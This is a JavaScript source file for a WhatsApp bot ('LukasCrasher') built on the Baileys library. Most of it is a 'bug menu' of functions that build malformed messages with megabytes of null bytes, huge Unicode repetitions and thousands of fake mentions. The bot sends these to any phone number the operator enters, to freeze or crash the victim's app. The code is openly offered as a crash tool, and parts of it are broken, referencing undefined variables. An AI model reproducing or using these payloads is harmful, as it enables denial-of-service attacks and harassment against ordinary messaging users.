//========HELO FRIEND========//
require('./config')
const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@whiskeysockets/baileys");
const fs = require('fs-extra')
const util = require('util')
const chalk = require('chalk')
const { addPremiumUser, delPremiumUser } = require("./lib/premiun");
const { getBuffer, getGroupAdmins, getSizeMedia, fetchJson, sleep, isUrl, runtime } = require('./lib/myfunction');
//===============
module.exports = Zyy = async (Zyy, m, chatUpdate, store) => {
try {
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text : "");
const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
const isCmd = !!prefix;  
const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
const text = q = args.join(" ")//hard
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
//======================
const botNumber = await Zyy.decodeJid(Zyy.user.id);
const premuser = JSON.parse(fs.readFileSync("./system/database/premium.json"));
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
if (!Zyy.public && !isCreator) return;
//======================
const isGroup = m.chat.endsWith("@g.us");
const groupMetadata = isGroup ? await Zyy.groupMetadata(m.chat).catch(() => ({})) : {};
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const isBotAdmins = groupAdmins.includes(botNumber);
const isAdmins = groupAdmins.includes(m.sender);
const groupName = groupMetadata.subject || "";
//======================
if (m.message) {
Zyy.readMessages([m.key]);
console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
console.log(`┃¤ ${chalk.hex("#FFD700").bold("📩 NEW MESSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Dari:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
console.log(`┃¤ ${chalk.hex("#FFA500")("📍 Di:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
console.log(`┃¤ ${chalk.hex("#00FF00")("📝 Pesan:")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}

// FUNCTION BUG //
async function AudioXDellay(sock, target) {
  const msg = {
    to: target,
    message: {
      viewOnceMessage: {
        message: {
          videoMessage: {
            caption: "꧔꧈".repeat(600),
            mimetype: "video/mp4",
            fileName: "𝐀𝐦𝐞𝐥𝐢𝐚𝐚𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝", 
            fileLength: "9999999999",
            seconds: 999999,
            mediaKey: "v/J9vWyG92CnR0fqagJ7GBxQzmDG3+cV+DBL1yyECBI=",
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        }
      },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        ptt: true,
        seconds: 9999,
        fileName: "𝐀𝐦𝐞𝐥𝐢𝐚 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝" + "꧔꧈".repeat(500),
        fileLength: "9999999999",
        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=", 
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: [
            ...Array.from({ length: 1 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  };

  await Zyy.sendMessage(msg.to, msg.message);
}

		
async function invisiblehard(sock, target) {
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "⎋⭑̤⟅̊༑ ▾ 𝐍͢𝐑ͮ𝐔𝚯ͮ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯ͮ𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑‣", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "⎋⭑̤⟅̊༑ ▾ 𝐍͢𝐑ͮ𝐔𝚯ͮ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯ͮ𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑‣",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
    
  const msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "⎋⭑̤⟅̊༑ ▾ 𝐍͢𝐑ͮ𝐔𝚯ͮ ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯ͮ𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑‣",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "99999999")
  });

  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  const msg5 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

  for (const msg of [nsg1, nsg2, msg3, msg4, msg5]) {
    await Zyy.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green("Send Bug By NeuroZap🐉"));
  }
}		

async function KIdzABbys(target, mention) {
  let msg = await generateWAMessageFromContent(x, {
    buttonsMessage: {
      text: "OmOsakaIsBack".repeat(95000),
      contentText: "⭑̤⟅̊༑ ▾ KingKong ⿻ OmOsaka ⿻ ▾ ༑̴⟆⭑̤".repeat(777777),
      footerText: "TheMonkeyOmOsaka ",
      buttons: [
        {
          buttonId: "TheOmOsaka",
          buttonText: {
            displayText: " GacorAbiezz " + "⭑̤⟅̊༑".repeat(104500),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await Zyy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Zyy.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "MarkPenciptaWa",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}	

async function TheHardXyz(target, jumlah = 1000, mention) {
  let mentionAi = (jumlah) => {
    return [
      "0@s.whatsapp.net",
      ...Array.from({ length: jumlah }, () =>
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
      )
    ]
  }
  
  let aiMentions = mentionAi(jumlah)
  let msgContent = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -999.4771901,
          degreesLongitude: 999.4771901,
          name: "xnxx",
          address: "null",
          contextInfo: {
            stanzaId: "A53737D6CE47253579FA0A0CA9A94F1C",
            participant: target,
            mentionedJid: aiMentions,
            quotedMessage: {
              conversation: "\u0000".repeat(200000)
            }
          }
        }
      }
    }
  }

  const Msg = await generateWAMessageFromContent(target, msgContent, {})

 await Zyy.relayMessage("status@broadcast", Msg.message, {
        messageId: Msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    
  if (mention) {
    await Zyy.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: Msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "The - Hard - Xyz By OmOsaka2Real" },
            content: undefined
          }
        ]
      }
    )
  }
    
  console.log("succes send bug")
}	

async function InvisCall(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "༏ 𝐗𝐳𝐞𝐫𝐨༝𝐘𝐮𝐝𝐗 ༏",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(15000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await Zyy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
async function blanknih(target) {
  const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "༏ 𝐗𝐳𝐞𝐫𝐨༝𝐘𝐮𝐝𝐗 ༏" + "ꦽꦾ".repeat(15000),
      caption: "༼༏ 𝐗𝐩𝐚𝐧𝐚𝐭𝐢𝐨𝐍 ༏༽" + "ꦽꦾ".repeat(15000),
      inviteExpiration: "9282682616283736",
    }
  };

  await Zyy.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target }
  });
}

async function JtwCrashUi(target) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        target,
        ...Array.from({ length: 30000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    try {
        for (let i = 0; i < 111; i++) {
            const message = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: '666@newsletter',
                            newsletterName: "ꦾ".repeat(60000),
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                            caption: "ꦾ".repeat(90000),
                            inviteExpiration: Date.now() + 0x99999999999abcdef,
                        },
                    },
                },
                nativeFlowMessage: {
                    messageParamsJson: "[{".repeat(10000),
                    buttons: [
                        {
                            name: "mpm",
                            buttonParamsJson: "\u0000".repeat(808808)
                        },
                        {
                            name: "single_select",
                            buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
                        },
                        {
                            name: "galaxy_message",
                            buttonParamsJson: JSON.stringify({ status: "1" })
                        },
                        {
                            name: "call_permission_request",
                            buttonParamsJson: "[{".repeat(808808)
                        }
                    ]
                },
                contextInfo: {
                    remoteJid: target,
                    participant: target,
                    mentionedJid: mentionedList,
                    stanzaId: asep.generateMessageTag(),
                    businessMessageForwardInfo: {
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    },
                },
            };

            await Zyy.relayMessage(target, message, {
                userJid: target,
            });
        }
    } catch (error) {
        console.log("error:\n" + error);
    }
}

switch (command) {
//case bug
case 'xstun': {
                if (!isCreator) return m.reply(config.message.owner);
                if (!q) return m.reply(`— ex: ${prefix + command} 62`);
                
                let jidx = q.replace(/[^0-9]/g, "");
                if (jidx.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                
                let isTarget = `${jidx}@s.whatsapp.net`;
                m.reply(`success! sent crash ios to ${isTarget}`);
                
                Invis(1000, isTarget);
                console.log(chalk.red.bold("Success!"))
            }
            break;

            // bug
            case 'delay':
            case 'Invis':
            case 'lukascombo':
            case 'delayhard':
            case 'blankui': 
            case 'crashui': {
  if (!isCreator) return m.reply(config.message.owner);
  if (!q) return m.reply(`Ex: ${prefix + command} 62xxxx`);

  const jidx  = q.replace(/\D/g, '');
  if (jidx.startsWith('0')) return m.reply(`Ex: ${prefix + command} 62xxxx`);
  const target = jidx + '@s.whatsapp.net';

  m.reply(`Success! sent bug to ${target}`);

  for (let i = 0; i < 3; i++) {
    await AudioXDellay(target);
    await invisiblehard(target);
    await KIdzABbys(target);
    await TheHardXyz(target);
    await InvisCall(target);
    await blanknih(target);
    await JtwCrashUi(target);
  }

  console.log(chalk.red.bold('Success!'));
  break;
}

//======================
case 'addowner': {
                if (!isCreator) return m.reply(config.message.owner)
                if (!q) return m.reply(`— ex: ${prefix + command} 62`);
                
                let bijipler = q.replace(/[^0-9]/g, "")
                if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                let add = bijipler + '@s.whatsapp.net'
                
                let capt = `anda kini telah mendapatkan akses owner ke bot`
                kontributor.push(bijipler)
                fs.writeFileSync(path.resolve(__dirname, './KazeeDmiu/lib/database/owner.json'), JSON.stringify(kontributor), 'utf8')
                reply("berhasil menambahkan ke daftar owner")
                await sleep(5000)
                m.reply(capt, add)
            }
            break
            case 'delowner':{
                if (!isCreator) return m.reply(config.message.owner)
                if (!q) return m.reply(`— ex: ${prefix + command} 62`);
            
                let bijipler = q.replace(/[^0-9]/g,"")
                if (bijipler.startsWith('0')) return m.reply(`— ex: ${prefix + command} 62 !!`)
                let index = kontributor.indexOf(bijipler)
                if (index>-1) {
                    kontributor.splice(index,1)
                    fs.writeFileSync(path.resolve(__dirname,'./KazeeDmiu/lib/database/owner.json'),JSON.stringify(kontributor),'utf8')
                    m.reply("owner berhasil dihapus")
                } else {
                    m.reply("nomor tidak ditemukan dalam daftar owner")
                }
            }
            break

//======================
case "menu": {
let itsmenu = `
\`𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 𝗕𝗢𝗧\`
⌬ 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : your name 
⌬ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 : 2.0
⌬ 𝖭𝖺𝗆𝖾𝖡𝗈𝗍 : LukasCrasher 
⌬ 𝖲𝗍𝖺𝗍𝗎𝗌𝖲𝖼𝗋𝗂𝗉𝗍 : 𝖵𝗂𝗉 𝖡𝗎𝗒 𝖮𝗇𝗅𝗒𝗒!!
⌬ 𝖫𝖺𝗇𝗀𝗎𝖺𝗀𝖾 : 𝖩𝖺𝗏𝖺 𝖲𝖼𝗋𝗂𝗉𝗍
⌬ 𝖠𝖼𝗍𝗂𝗈𝗇 : https://ẉ.dev/your name 

\`𝗕𝗨𝗚 𝗠𝗘𝗡𝗨\`
▢ .delay
▢ .invis
▢ .lukascombo
▢ .DelayHard
▢ .blankui
▢ .crashui    

\`𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨\`
▢ .addprem
▢ .delprem
▢ .self
▢ .public

© 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖡𝗒 DanzzOffc`;
await Zyy.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/zw2p5v.jpg" },
caption: itsmenu
}, { quoted: m });
await Zyy.sendMessage(m.chat, { audio: { url: "https://files.catbox.moe/y810br.mp3" }, mimetype: "audio/mpeg", ptt: true }, { quoted: null })
};
break; 
//======================
case "addprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /addprem 62xxx");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ Nomor *\n• ${user}* berhasil ditambah ke database user premium`)}
break;
//======================
case "delprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /delprem 62xxx");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ Nomor *\n• ${user}* berhasil dihapus dari database premium` : "❌ User tidak ditemukan")}
break;
//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}
